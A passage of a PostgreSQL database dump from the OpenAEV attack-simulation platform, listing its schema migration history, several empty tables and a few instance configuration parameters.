54	2.53	Inject status upgrade	JDBC	io.openaev.migration.V2_53__Inject_status_upgrade	\N	user	2026-01-09 14:18:31.952483	6	t
55	2.54	LessonsLearned	JDBC	io.openaev.migration.V2_54__LessonsLearned	\N	user	2026-01-09 14:18:31.999432	172	t
56	2.55	Update communication	JDBC	io.openaev.migration.V2_55__Update_communication	\N	user	2026-01-09 14:18:32.214484	2	t
57	2.56	ModifyLessonsLearned	JDBC	io.openaev.migration.V2_56__ModifyLessonsLearned	\N	user	2026-01-09 14:18:32.229248	65	t
58	2.57	Group organizations	JDBC	io.openaev.migration.V2_57__Group_organizations	\N	user	2026-01-09 14:18:32.335383	15	t
59	2.58	Reports	JDBC	io.openaev.migration.V2_58__Reports	\N	user	2026-01-09 14:18:32.395313	22	t
60	2.59	ModifyReport	JDBC	io.openaev.migration.V2_59__ModifyReport	\N	user	2026-01-09 14:18:32.453352	22	t
61	2.60	Delete fk users injects	JDBC	io.openaev.migration.V2_60__Delete_fk_users_injects	\N	user	2026-01-09 14:18:32.491604	36	t
62	2.61	Inject not null depends duration	JDBC	io.openaev.migration.V2_61__Inject_not_null_depends_duration	\N	user	2026-01-09 14:18:32.551182	5	t
63	2.62	Variables Variable tags	JDBC	io.openaev.migration.V2_62__Variables_Variable_tags	\N	user	2026-01-09 14:18:32.583974	24	t
64	2.63	InjectExpectation upgrade	JDBC	io.openaev.migration.V2_63__InjectExpectation_upgrade	\N	user	2026-01-09 14:18:32.616789	6	t
65	2.64	Audiences detach exercises	JDBC	io.openaev.migration.V2_64__Audiences_detach_exercises	\N	user	2026-01-09 14:18:32.651489	86	t
66	2.65	Audiences follow and media	JDBC	io.openaev.migration.V2_65__Audiences_follow_and_media	\N	user	2026-01-09 14:18:32.77929	13	t
67	2.66	Attack patterns	JDBC	io.openaev.migration.V2_66__Attack_patterns	\N	user	2026-01-09 14:18:32.818927	93	t
68	2.67	Variables Enum	JDBC	io.openaev.migration.V2_67__Variables_Enum	\N	user	2026-01-09 14:18:32.929553	48	t
69	2.68	Assets Asset Groups	JDBC	io.openaev.migration.V2_68__Assets_Asset_Groups	\N	user	2026-01-09 14:18:33.003435	242	t
70	2.69	Modify Inject async ids	JDBC	io.openaev.migration.V2_69__Modify_Inject_async_ids	\N	user	2026-01-09 14:18:33.28832	9	t
71	2.70	Enhance attack patterns	JDBC	io.openaev.migration.V2_70__Enhance_attack_patterns	\N	user	2026-01-09 14:18:33.33874	30	t
72	2.71	Modify inject	JDBC	io.openaev.migration.V2_71__Modify_inject	\N	user	2026-01-09 14:18:33.400432	96	t
73	2.72	Add index user email lower case	JDBC	io.openaev.migration.V2_72__Add_index_user_email_lower_case	\N	user	2026-01-09 14:18:33.507389	11	t
74	2.73	Scenarios	JDBC	io.openaev.migration.V2_73__Scenarios	\N	user	2026-01-09 14:18:33.544589	87	t
75	2.74	OpenBAS	JDBC	io.openaev.migration.V2_74__OpenBAS	\N	user	2026-01-09 14:18:33.646046	4	t
76	2.75	Inject expectation result	JDBC	io.openaev.migration.V2_75__Inject_expectation_result	\N	user	2026-01-09 14:18:33.666543	4	t
77	2.76	Add reply to scenarios and exercises	JDBC	io.openaev.migration.V2_76__Add_reply_to_scenarios_and_exercises	\N	user	2026-01-09 14:18:33.685096	14	t
78	2.77	Asset group dynamic filter	JDBC	io.openaev.migration.V2_77__Asset_group_dynamic_filter	\N	user	2026-01-09 14:18:33.729091	10	t
79	2.78	Add tag unique index	JDBC	io.openaev.migration.V2_78__Add_tag_unique_index	\N	user	2026-01-09 14:18:33.814151	380	t
80	2.79	Injectors	JDBC	io.openaev.migration.V2_79__Injectors	\N	user	2026-01-09 14:18:34.237861	44	t
81	2.80	Inject status	JDBC	io.openaev.migration.V2_80__Inject_status	\N	user	2026-01-09 14:18:34.320867	87	t
82	2.81	Contracts	JDBC	io.openaev.migration.V2_81__Contracts	\N	user	2026-01-09 14:18:34.436612	76	t
83	2.82	Collectors	JDBC	io.openaev.migration.V2_82__Collectors	\N	user	2026-01-09 14:18:34.527905	12	t
84	2.83	Scenario recurrence	JDBC	io.openaev.migration.V2_83__Scenario_recurrence	\N	user	2026-01-09 14:18:34.566804	66	t
85	2.84	Scenario recurrence end date	JDBC	io.openaev.migration.V2_84__Scenario_recurrence_end_date	\N	user	2026-01-09 14:18:34.661293	15	t
86	2.85	Full text search	JDBC	io.openaev.migration.V2_85__Full_text_search	\N	user	2026-01-09 14:18:34.702466	81	t
87	2.86	Add column atomic testing to injectors contracts	JDBC	io.openaev.migration.V2_86__Add_column_atomic_testing_to_injectors_contracts	\N	user	2026-01-09 14:18:34.800779	7	t
88	2.87	Delete constraint not null inject expectations exercise	JDBC	io.openaev.migration.V2_87__Delete_constraint_not_null_inject_expectations_exercise	\N	user	2026-01-09 14:18:34.818088	2	t
89	2.88	Truncate injector collector	JDBC	io.openaev.migration.V2_88__Truncate_injector_collector	\N	user	2026-01-09 14:18:34.850153	44	t
90	2.89	Add foreign key injector contract to inject	JDBC	io.openaev.migration.V2_89__Add_foreign_key_injector_contract_to_inject	\N	user	2026-01-09 14:18:34.924399	10	t
91	2.90	Custom injectors	JDBC	io.openaev.migration.V2_90__Custom_injectors	\N	user	2026-01-09 14:18:34.950198	6	t
92	2.91	Custom inject contracts	JDBC	io.openaev.migration.V2_91__Custom_inject_contracts	\N	user	2026-01-09 14:18:34.98117	22	t
93	2.92	Collectors external	JDBC	io.openaev.migration.V2_92__Collectors_external	\N	user	2026-01-09 14:18:35.0401	9	t
94	2.93	Payloads	JDBC	io.openaev.migration.V2_93__Payloads	\N	user	2026-01-09 14:18:35.062533	113	t
95	2.94	Remove foreign key injector contract to inject	JDBC	io.openaev.migration.V2_94__Remove_foreign_key_injector_contract_to_inject	\N	user	2026-01-09 14:18:35.195357	2	t
96	2.95	Truncate assets	JDBC	io.openaev.migration.V2_95__Truncate_assets	\N	user	2026-01-09 14:18:35.206495	20	t
97	2.96	Mitigations	JDBC	io.openaev.migration.V2_96__Mitigations	\N	user	2026-01-09 14:18:35.244185	47	t
98	2.97	Injector agents	JDBC	io.openaev.migration.V2_97__Injector_agents	\N	user	2026-01-09 14:18:35.308296	7	t
99	2.98	Scenario enhancement	JDBC	io.openaev.migration.V2_98__Scenario_enhancement	\N	user	2026-01-09 14:18:35.336779	18	t
100	2.99	Injector contracts platforms	JDBC	io.openaev.migration.V2_99__Injector_contracts_platforms	\N	user	2026-01-09 14:18:35.366495	2	t
101	3.01	Link injects contracts	JDBC	io.openaev.migration.V3_01__Link_injects_contracts	\N	user	2026-01-09 14:18:35.387042	23	t
102	3.02	Exercise enhancement	JDBC	io.openaev.migration.V3_02__Exercise_enhancement	\N	user	2026-01-09 14:18:35.434002	18	t
103	3.03	Executors	JDBC	io.openaev.migration.V3_03__Executors	\N	user	2026-01-09 14:18:35.468365	48	t
104	3.04	Assets	JDBC	io.openaev.migration.V3_04__Assets	\N	user	2026-01-09 14:18:35.54134	47	t
105	3.05	Inject type	JDBC	io.openaev.migration.V3_05__Inject_type	\N	user	2026-01-09 14:18:35.601131	3	t
106	3.06	Assets	JDBC	io.openaev.migration.V3_06__Assets	\N	user	2026-01-09 14:18:35.615376	11	t
107	3.07	Scenarios	JDBC	io.openaev.migration.V3_07__Scenarios	\N	user	2026-01-09 14:18:35.635803	3	t
108	3.08	Injectors	JDBC	io.openaev.migration.V3_08__Injectors	\N	user	2026-01-09 14:18:35.64783	2	t
109	3.09	Assets	JDBC	io.openaev.migration.V3_09__Assets	\N	user	2026-01-09 14:18:35.659954	4	t
110	3.10	Inject expectation signatures	JDBC	io.openaev.migration.V3_10__Inject_expectation_signatures	\N	user	2026-01-09 14:18:35.67137	2	t
111	3.11	Assets	JDBC	io.openaev.migration.V3_11__Assets	\N	user	2026-01-09 14:18:35.680911	2	t
112	3.12	Payloads	JDBC	io.openaev.migration.V3_12__Payloads	\N	user	2026-01-09 14:18:35.690086	26	t
113	3.13	Payloads Attack Patterns	JDBC	io.openaev.migration.V3_13__Payloads_Attack_Patterns	\N	user	2026-01-09 14:18:35.730893	12	t
114	3.14	Injectors payload	JDBC	io.openaev.migration.V3_14__Injectors_payload	\N	user	2026-01-09 14:18:35.755849	3	t
115	3.15	Injector contracts Payloads	JDBC	io.openaev.migration.V3_15__Injector_contracts_Payloads	\N	user	2026-01-09 14:18:35.768727	5	t
116	3.16	Add array union agg method	JDBC	io.openaev.migration.V3_16__Add_array_union_agg_method	\N	user	2026-01-09 14:18:35.784456	4	t
117	3.17	Payloads	JDBC	io.openaev.migration.V3_17__Payloads	\N	user	2026-01-09 14:18:35.797538	3	t
118	3.18	Injects contract null	JDBC	io.openaev.migration.V3_18__Injects_contract_null	\N	user	2026-01-09 14:18:35.809281	2	t
119	3.19	Add index for atomic testings	JDBC	io.openaev.migration.V3_19__Add_index_for_atomic_testings	\N	user	2026-01-09 14:18:35.8206	4	t
120	3.20	AgentJobs	JDBC	io.openaev.migration.V3_20__AgentJobs	\N	user	2026-01-09 14:18:35.833395	16	t
121	3.21	Agent executors	JDBC	io.openaev.migration.V3_21__Agent_executors	\N	user	2026-01-09 14:18:35.873934	11	t
122	3.22	Endpoints	JDBC	io.openaev.migration.V3_22__Endpoints	\N	user	2026-01-09 14:18:35.901263	4	t
123	3.23	Payloads	JDBC	io.openaev.migration.V3_23__Payloads	\N	user	2026-01-09 14:18:35.913967	11	t
124	3.24	Payload collector	JDBC	io.openaev.migration.V3_24__Payload_collector	\N	user	2026-01-09 14:18:35.961239	11	t
125	3.25	Assets	JDBC	io.openaev.migration.V3_25__Assets	\N	user	2026-01-09 14:18:35.991952	16	t
126	3.26	Assets platform	JDBC	io.openaev.migration.V3_26__Assets_platform	\N	user	2026-01-09 14:18:36.021951	5	t
127	3.27	Collectors	JDBC	io.openaev.migration.V3_27__Collectors	\N	user	2026-01-09 14:18:36.036033	10	t
128	3.28	Payloads	JDBC	io.openaev.migration.V3_28__Payloads	\N	user	2026-01-09 14:18:36.068187	7	t
129	3.29	Add tables xls mappers	JDBC	io.openaev.migration.V3_29__Add_tables_xls_mappers	\N	user	2026-01-09 14:18:36.087049	68	t
130	3.30	Score type	JDBC	io.openaev.migration.V3_30__Score_type	\N	user	2026-01-09 14:18:36.193406	37	t
131	3.31	Add Injects tests statuses	JDBC	io.openaev.migration.V3_31__Add_Injects_tests_statuses	\N	user	2026-01-09 14:18:36.272421	42	t
132	3.32	Add column lessons anonymized	JDBC	io.openaev.migration.V3_32__Add_column_lessons_anonymized	\N	user	2026-01-09 14:18:36.314557	7	t
133	3.33	Add Index inject	JDBC	io.openaev.migration.V3_33__Add_Index_inject	\N	user	2026-01-09 14:18:36.352301	35	t
134	3.34	Remove cascade delete dependency	JDBC	io.openaev.migration.V3_34__Remove_cascade_delete_dependency	\N	user	2026-01-09 14:18:36.456838	22	t
135	3.35	Modify Injects tests statuses status inject on delete	JDBC	io.openaev.migration.V3_35__Modify_Injects_tests_statuses_status_inject_on_delete	\N	user	2026-01-09 14:18:36.515859	26	t
136	3.36	Alter inject expectation score	JDBC	io.openaev.migration.V3_36__Alter_inject_expectation_score	\N	user	2026-01-09 14:18:36.563008	8	t
137	3.37	Add column elevation required payload	JDBC	io.openaev.migration.V3_37__Add_column_elevation_required_payload	\N	user	2026-01-09 14:18:36.604716	10	t
138	3.38	Add column trigger now	JDBC	io.openaev.migration.V3_38__Add_column_trigger_now	\N	user	2026-01-09 14:18:36.646294	13	t
139	3.39	Add column status commands lines	JDBC	io.openaev.migration.V3_39__Add_column_status_commands_lines	\N	user	2026-01-09 14:18:36.708713	11	t
140	3.40	Add reports tables	JDBC	io.openaev.migration.V3_40__Add_reports_tables	\N	user	2026-01-09 14:18:36.731719	75	t
141	3.41	Update constraint on delete cascade	JDBC	io.openaev.migration.V3_41__Update_constraint_on_delete_cascade	\N	user	2026-01-09 14:18:36.864978	53	t
142	3.42	Add column expiration time expectations	JDBC	io.openaev.migration.V3_42__Add_column_expiration_time_expectations	\N	user	2026-01-09 14:18:36.929299	12	t
143	3.43	Payloads default values	JDBC	io.openaev.migration.V3_43__Payloads_default_values	\N	user	2026-01-09 14:18:36.959671	15	t
144	3.44	Add column executable arch	JDBC	io.openaev.migration.V3_44__Add_column_executable_arch	\N	user	2026-01-09 14:18:37.006746	9	t
145	3.45	Add indexes scenario exercise latency	JDBC	io.openaev.migration.V3_45__Add_indexes_scenario_exercise_latency	\N	user	2026-01-09 14:18:37.049475	70	t
146	3.46	Add table inject dependencies	JDBC	io.openaev.migration.V3_46__Add_table_inject_dependencies	\N	user	2026-01-09 14:18:37.144407	46	t
147	3.47	Enforce payload command definition consistency	JDBC	io.openaev.migration.V3_47__Enforce_payload_command_definition_consistency	\N	user	2026-01-09 14:18:37.205542	24	t
148	3.48	Set Payload source as community and deprecate	JDBC	io.openaev.migration.V3_48__Set_Payload_source_as_community_and_deprecate	\N	user	2026-01-09 14:18:37.255151	15	t
149	3.49	Drop injects payloads table	JDBC	io.openaev.migration.V3_49__Drop_injects_payloads_table	\N	user	2026-01-09 14:18:37.297931	26	t
150	3.50	Adding wrapper functions	JDBC	io.openaev.migration.V3_50__Adding_wrapper_functions	\N	user	2026-01-09 14:18:37.351788	13	t
151	3.51	Add architecture to payload	JDBC	io.openaev.migration.V3_51__Add_architecture_to_payload	\N	user	2026-01-09 14:18:37.39361	20	t
152	3.52	Sync archi names	JDBC	io.openaev.migration.V3_52__Sync_archi_names	\N	user	2026-01-09 14:18:37.44577	13	t
153	3.53	Update Commands In Inject Status	JDBC	io.openaev.migration.V3_53__Update_Commands_In_Inject_Status	\N	user	2026-01-09 14:18:37.470888	15	t
154	3.54	Add table agents	JDBC	io.openaev.migration.V3_54__Add_table_agents	\N	user	2026-01-09 14:18:37.517965	89	t
155	3.55	Add obfuscator inject contract	JDBC	io.openaev.migration.V3_55__Add_obfuscator_inject_contract	\N	user	2026-01-09 14:18:37.624024	19	t
156	3.56	TagRule	JDBC	io.openaev.migration.V3_56__TagRule	\N	user	2026-01-09 14:18:37.676693	35	t
157	3.57	Update table asset agent jobs	JDBC	io.openaev.migration.V3_57__Update_table_asset_agent_jobs	\N	user	2026-01-09 14:18:37.767046	42	t
158	3.58	TagRule Update	JDBC	io.openaev.migration.V3_58__TagRule_Update	\N	user	2026-01-09 14:18:37.839675	60	t
159	3.59	Delete all dryInject dryrun	JDBC	io.openaev.migration.V3_59__Delete_all_dryInject_dryrun	\N	user	2026-01-09 14:18:37.958038	69	t
160	3.60	Alter xls mapper table	JDBC	io.openaev.migration.V3_60__Alter_xls_mapper_table	\N	user	2026-01-09 14:18:38.058854	12	t
161	3.61	Delete all update agent asset agent jobs	JDBC	io.openaev.migration.V3_61__Delete_all_update_agent_asset_agent_jobs	\N	user	2026-01-09 14:18:38.098893	7	t
162	3.62	make exercise pause tz aware	JDBC	io.openaev.migration.V3_62__make_exercise_pause_tz_aware	\N	user	2026-01-09 14:18:38.126898	6	t
163	3.63	Add agent to inject expectation	JDBC	io.openaev.migration.V3_63__Add_agent_to_inject_expectation	\N	user	2026-01-09 14:18:38.144656	15	t
164	3.64	Add ExecutionTraces table	JDBC	io.openaev.migration.V3_64__Add_ExecutionTraces_table	\N	user	2026-01-09 14:18:38.183806	76	t
165	3.65	Update Inject Status status payload	JDBC	io.openaev.migration.V3_65__Update_Inject_Status_status_payload	\N	user	2026-01-09 14:18:38.276684	9	t
166	3.66	Migrate agents to same endpoint	JDBC	io.openaev.migration.V3_66__Migrate_agents_to_same_endpoint	\N	user	2026-01-09 14:18:38.296432	141	t
167	3.67	Update Execution traces status asset inactive	JDBC	io.openaev.migration.V3_67__Update_Execution_traces_status_asset_inactive	\N	user	2026-01-09 14:18:38.453159	6	t
168	3.68	Add Findings	JDBC	io.openaev.migration.V3_68__Add_Findings	\N	user	2026-01-09 14:18:38.467896	12	t
169	3.69	Assets IP	JDBC	io.openaev.migration.V3_69__Assets_IP	\N	user	2026-01-09 14:18:38.502206	12	t
170	3.70	Findings associations	JDBC	io.openaev.migration.V3_70__Findings_associations	\N	user	2026-01-09 14:18:38.536688	36	t
171	3.71	Add Instance Informations	JDBC	io.openaev.migration.V3_71__Add_Instance_Informations	\N	user	2026-01-09 14:18:38.589072	14	t
172	3.72	Add FKs jointure tables to tags	JDBC	io.openaev.migration.V3_72__Add_FKs_jointure_tables_to_tags	\N	user	2026-01-09 14:18:38.618184	157	t
173	3.73	Add Executor Background color	JDBC	io.openaev.migration.V3_73__Add_Executor_Background_color	\N	user	2026-01-09 14:18:38.787905	6	t
174	3.74	Add Output parser	JDBC	io.openaev.migration.V3_74__Add_Output_parser	\N	user	2026-01-09 14:18:38.805492	50	t
175	3.75	Add table injects expectations traces	JDBC	io.openaev.migration.V3_75__Add_table_injects_expectations_traces	\N	user	2026-01-09 14:18:38.882553	24	t
176	3.76	Add challenge attempt	JDBC	io.openaev.migration.V3_76__Add_challenge_attempt	\N	user	2026-01-09 14:18:38.920989	19	t
177	3.77	Add column name in findings	JDBC	io.openaev.migration.V3_77__Add_column_name_in_findings	\N	user	2026-01-09 14:18:38.956015	5	t
178	3.78	Add ExternalReference AssetGroup	JDBC	io.openaev.migration.V3_78__Add_ExternalReference_AssetGroup	\N	user	2026-01-09 14:18:38.990434	6	t
179	3.79	Update CS agents id	JDBC	io.openaev.migration.V3_79__Update_CS_agents_id	\N	user	2026-01-09 14:18:39.021628	14	t
180	3.80	Change Parameters	JDBC	io.openaev.migration.V3_80__Change_Parameters	\N	user	2026-01-09 14:18:39.046035	2	t
181	3.81	Add Unique constraint findings	JDBC	io.openaev.migration.V3_81__Add_Unique_constraint_findings	\N	user	2026-01-09 14:18:39.063634	7	t
182	3.82	NotificationRule	JDBC	io.openaev.migration.V3_82__NotificationRule	\N	user	2026-01-09 14:18:39.081568	13	t
183	3.83	Add Unique constraint injects expectations traces	JDBC	io.openaev.migration.V3_83__Add_Unique_constraint_injects_expectations_traces	\N	user	2026-01-09 14:18:39.107506	12	t
184	3.84	Indexing status	JDBC	io.openaev.migration.V3_84__Indexing_status	\N	user	2026-01-09 14:18:39.134837	37	t
185	3.85	Add Custom Dashboard	JDBC	io.openaev.migration.V3_85__Add_Custom_Dashboard	\N	user	2026-01-09 14:18:39.182662	12	t
186	3.86	Enforce constraint grant scenario	JDBC	io.openaev.migration.V3_86__Enforce_constraint_grant_scenario	\N	user	2026-01-09 14:18:39.207583	9	t
187	3.87	Add Index findings	JDBC	io.openaev.migration.V3_87__Add_Index_findings	\N	user	2026-01-09 14:18:39.226827	4	t
188	3.88	Enforce constraint asset group dynamic filter	JDBC	io.openaev.migration.V3_88__Enforce_constraint_asset_group_dynamic_filter	\N	user	2026-01-09 14:18:39.240491	3	t
189	3.89	Update Result Label Expectations	JDBC	io.openaev.migration.V3_89__Update_Result_Label_Expectations	\N	user	2026-01-09 14:18:39.254214	4	t
190	3.90	add automatic finding hash column	JDBC	io.openaev.migration.V3_90__add_automatic_finding_hash_column	\N	user	2026-01-09 14:18:39.269085	8	t
191	3.91	Add StructuredOutput ExecutionTraces	JDBC	io.openaev.migration.V3_91__Add_StructuredOutput_ExecutionTraces	\N	user	2026-01-09 14:18:39.285794	15	t
192	3.92	Role	JDBC	io.openaev.migration.V3_92__Role	\N	user	2026-01-09 14:18:39.316479	41	t
193	3.93	Alter Creation Date With Time Zone	JDBC	io.openaev.migration.V3_93__Alter_Creation_Date_With_Time_Zone	\N	user	2026-01-09 14:18:39.38981	242	t
194	3.94	tag table timestamps	JDBC	io.openaev.migration.V3_94__tag_table_timestamps	\N	user	2026-01-09 14:18:39.652002	15	t
195	3.95	Migrate findings CVE new format	JDBC	io.openaev.migration.V3_95__Migrate_findings_CVE_new_format	\N	user	2026-01-09 14:18:39.682015	33	t
196	3.96	Cves	JDBC	io.openaev.migration.V3_96__Cves	\N	user	2026-01-09 14:18:39.728539	49	t
197	3.97	Add Eol Column	JDBC	io.openaev.migration.V3_97__Add_Eol_Column	\N	user	2026-01-09 14:18:39.794618	5	t
198	3.98	insert widget config type key	JDBC	io.openaev.migration.V3_98__insert_widget_config_type_key	\N	user	2026-01-09 14:18:39.815267	4	t
199	3.99	Migrate Inject Expectation TTPs format	JDBC	io.openaev.migration.V3_99__Migrate_Inject_Expectation_TTPs_format	\N	user	2026-01-09 14:18:39.836444	3	t
200	4.01	Cves Default data	JDBC	io.openaev.migration.V4_01__Cves_Default_data	\N	user	2026-01-09 14:18:39.861122	80	t
201	4.02	Add Parameters Custom Dashboard	JDBC	io.openaev.migration.V4_02__Add_Parameters_Custom_Dashboard	\N	user	2026-01-09 14:18:39.956833	19	t
202	4.03	Update injector contracts predefined expectations	JDBC	io.openaev.migration.V4_03__Update_injector_contracts_predefined_expectations	\N	user	2026-01-09 14:18:39.987784	7	t
203	4.04	Detection Remediation	JDBC	io.openaev.migration.V4_04__Detection_Remediation	\N	user	2026-01-09 14:18:40.005995	40	t
204	4.05	reindexe inject to add inject children	JDBC	io.openaev.migration.V4_05__reindexe_inject_to_add_inject_children	\N	user	2026-01-09 14:18:40.07264	11	t
205	4.06	Fix vulnerability expectations	JDBC	io.openaev.migration.V4_06__Fix_vulnerability_expectations	\N	user	2026-01-09 14:18:40.101349	10	t
206	4.07	Fix es index base simulation side	JDBC	io.openaev.migration.V4_07__Fix_es_index_base_simulation_side	\N	user	2026-01-09 14:18:40.128303	8	t
207	4.08	Force reindex vulnerable endpoints	JDBC	io.openaev.migration.V4_08__Force_reindex_vulnerable_endpoints	\N	user	2026-01-09 14:18:40.161839	4	t
208	4.09	Update Detection Remediation	JDBC	io.openaev.migration.V4_09__Update_Detection_Remediation	\N	user	2026-01-09 14:18:40.181162	27	t
209	4.10	Update contrainst documents	JDBC	io.openaev.migration.V4_10__Update_contrainst_documents	\N	user	2026-01-09 14:18:40.222242	15	t
210	4.11	Payload Expectations	JDBC	io.openaev.migration.V4_11__Payload_Expectations	\N	user	2026-01-09 14:18:40.247034	4	t
211	4.12	List Widget config update	JDBC	io.openaev.migration.V4_12__List_Widget_config_update	\N	user	2026-01-09 14:18:40.266576	6	t
212	4.13	Update Role table	JDBC	io.openaev.migration.V4_13__Update_Role_table	\N	user	2026-01-09 14:18:40.290063	4	t
213	4.14	Add collector state	JDBC	io.openaev.migration.V4_14__Add_collector_state	\N	user	2026-01-09 14:18:40.303811	7	t
214	4.15	Add column injector contract external id	JDBC	io.openaev.migration.V4_15__Add_column_injector_contract_external_id	\N	user	2026-01-09 14:18:40.320562	9	t
215	4.16	Force es reindex injects	JDBC	io.openaev.migration.V4_16__Force_es_reindex_injects	\N	user	2026-01-09 14:18:40.350963	4	t
216	4.17	User Onboarding Enable	JDBC	io.openaev.migration.V4_17__User_Onboarding_Enable	\N	user	2026-01-09 14:18:40.36994	23	t
217	4.18	Update custom dashboards widgets	JDBC	io.openaev.migration.V4_18__Update_custom_dashboards_widgets	\N	user	2026-01-09 14:18:40.407644	7	t
218	4.19	Add parameters to custom dashboards	JDBC	io.openaev.migration.V4_19__Add_parameters_to_custom_dashboards	\N	user	2026-01-09 14:18:40.423931	8	t
219	4.20	Force es reindex injects	JDBC	io.openaev.migration.V4_20__Force_es_reindex_injects	\N	user	2026-01-09 14:18:40.443958	3	t
220	4.21	Add vulnerability fk on injector contracts	JDBC	io.openaev.migration.V4_21__Add_vulnerability_fk_on_injector_contracts	\N	user	2026-01-09 14:18:40.460249	16	t
221	4.22	Add octi stix objects	JDBC	io.openaev.migration.V4_22__Add_octi_stix_objects	\N	user	2026-01-09 14:18:40.504108	21	t
222	4.23	Force es reindex	JDBC	io.openaev.migration.V4_23__Force_es_reindex	\N	user	2026-01-09 14:18:40.546091	5	t
223	4.24	Refactor Grants Table	JDBC	io.openaev.migration.V4_24__Refactor_Grants_Table	\N	user	2026-01-09 14:18:40.567934	36	t
224	4.25	Remove Default Grants Table	JDBC	io.openaev.migration.V4_25__Remove_Default_Grants_Table	\N	user	2026-01-09 14:18:40.619366	9	t
225	4.26	Force es reindex and add after delete triggers	JDBC	io.openaev.migration.V4_26__Force_es_reindex_and_add_after_delete_triggers	\N	user	2026-01-09 14:18:40.640424	7	t
226	4.27	Rename asset group contract	JDBC	io.openaev.migration.V4_27__Rename_asset_group_contract	\N	user	2026-01-09 14:18:40.659106	4	t
227	4.28	Add security coverage send job	JDBC	io.openaev.migration.V4_28__Add_security_coverage_send_job	\N	user	2026-01-09 14:18:40.673796	10	t
228	4.29	Add default roles	JDBC	io.openaev.migration.V4_29__Add_default_roles	\N	user	2026-01-09 14:18:40.691776	8	t
229	4.30	Add Inject collect status	JDBC	io.openaev.migration.V4_30__Add_Inject_collect_status	\N	user	2026-01-09 14:18:40.708401	3	t
230	4.31	Update security coverages	JDBC	io.openaev.migration.V4_31__Update_security_coverages	\N	user	2026-01-09 14:18:40.719322	2	t
231	4.32	Rollback User Onboarding Enable	JDBC	io.openaev.migration.V4_32__Rollback_User_Onboarding_Enable	\N	user	2026-01-09 14:18:40.72949	16	t
232	4.33	Force redindex scenario	JDBC	io.openaev.migration.V4_33__Force_redindex_scenario	\N	user	2026-01-09 14:18:40.75552	2	t
233	4.34	Add getting started property to scenario	JDBC	io.openaev.migration.V4_34__Add_getting_started_property_to_scenario	\N	user	2026-01-09 14:18:40.766136	3	t
234	4.35	Clean agent side on inject expectation widget	JDBC	io.openaev.migration.V4_35__Clean_agent_side_on_inject_expectation_widget	\N	user	2026-01-09 14:18:40.776881	3	t
235	4.36	Force es reindex inject	JDBC	io.openaev.migration.V4_36__Force_es_reindex_inject	\N	user	2026-01-09 14:18:40.788025	2	t
236	4.37	Update Role table	JDBC	io.openaev.migration.V4_37__Update_Role_table	\N	user	2026-01-09 14:18:40.798202	2	t
237	4.38	Drop group organizations table	JDBC	io.openaev.migration.V4_38__Drop_group_organizations_table	\N	user	2026-01-09 14:18:40.808415	9	t
238	4.39	Force es reindex	JDBC	io.openaev.migration.V4_39__Force_es_reindex	\N	user	2026-01-09 14:18:40.840918	2	t
239	4.40	Modify detection remediation	JDBC	io.openaev.migration.V4_40__Modify_detection_remediation	\N	user	2026-01-09 14:18:40.849506	4	t
240	4.41	Update Collectors Name	JDBC	io.openaev.migration.V4_41__Update_Collectors_Name	\N	user	2026-01-09 14:18:40.860883	9	t
241	4.42	Manage injector external services	JDBC	io.openaev.migration.V4_42__Manage_injector_external_services	\N	user	2026-01-09 14:18:40.876036	5	t
242	4.43	Create Missing Time Range	JDBC	io.openaev.migration.V4_43__Create_Missing_Time_Range	\N	user	2026-01-09 14:18:40.888661	4	t
243	4.44	Rename cves table to vulnerabilities	JDBC	io.openaev.migration.V4_44__Rename_cves_table_to_vulnerabilities	\N	user	2026-01-09 14:18:40.933819	20	t
244	4.45	Add coverage columns	JDBC	io.openaev.migration.V4_45__Add_coverage_columns	\N	user	2026-01-09 14:18:40.962436	2	t
245	4.46	Rename platform title openaev	JDBC	io.openaev.migration.V4_46__Rename_platform_title_openaev	\N	user	2026-01-09 14:18:40.97215	5	t
246	4.47	Force es reindex all	JDBC	io.openaev.migration.V4_47__Force_es_reindex_all	\N	user	2026-01-09 14:18:40.985202	2	t
\.


--
-- Data for Name: mitigations; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.mitigations (mitigation_id, mitigation_created_at, mitigation_updated_at, mitigation_name, mitigation_description, mitigation_external_id, mitigation_stix_id, mitigation_log_sources, mitigation_threat_hunting_techniques) FROM stdin;
\.


--
-- Data for Name: mitigations_attack_patterns; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.mitigations_attack_patterns (mitigation_id, attack_pattern_id) FROM stdin;
\.


--
-- Data for Name: notification_rules; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.notification_rules (notification_rule_id, notification_resource_type, notification_resource_id, notification_rule_trigger, notification_rule_type, notification_rule_subject, user_id) FROM stdin;
\.


--
-- Data for Name: objectives; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.objectives (objective_id, objective_exercise, objective_title, objective_description, objective_priority, objective_created_at, objective_updated_at, objective_scenario) FROM stdin;
\.


--
-- Data for Name: organizations; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.organizations (organization_id, organization_name, organization_description, organization_created_at, organization_updated_at) FROM stdin;
\.


--
-- Data for Name: organizations_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.organizations_tags (organization_id, tag_id) FROM stdin;
\.


--
-- Data for Name: output_parsers; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.output_parsers (output_parser_id, output_parser_mode, output_parser_type, output_parser_payload_id, output_parser_created_at, output_parser_updated_at) FROM stdin;
\.


--
-- Data for Name: parameters; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.parameters (parameter_id, parameter_key, parameter_value) FROM stdin;
73e98809-cfe3-4ea4-94df-953edc03d14b	instance_id	32a8d52c-873a-4f19-acf3-66d5066024ad
aa344a42-2259-4851-8ece-8416bdbb482a	instance_creation_date	2026-01-09 14:18:27.752735
ae13d647-a759-424b-8a46-50dbe883f47c	smtp_service_available	false
13b03a3a-e8b3-4470-94f1-bcda6f34d5fc	imap_service_available	false
78b1de9b-579c-47bc-a7f5-9db28b2430d3	platform_home_dashboard	d02a5fec-41fc-416b-9e8f-8c89a89fa829
4794ce71-6610-48ab-8945-450615a0d33c	platform_scenario_dashboard	7f92d0b7-3535-4414-80e8-0eed5c2068e0
ed0f5acf-f7a3-4ce5-b7a8-59d36d6ea99d	platform_simulation_dashboard	71de8342-011e-4cac-a8ab-477cb0770756
23fd2b20-7174-48d4-9663-f1e3568b5def	starterpack	StarterPack creation process completed
\.


--
-- Data for Name: pauses; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.pauses (pause_id, pause_exercise, pause_date, pause_duration) FROM stdin;
\.


--
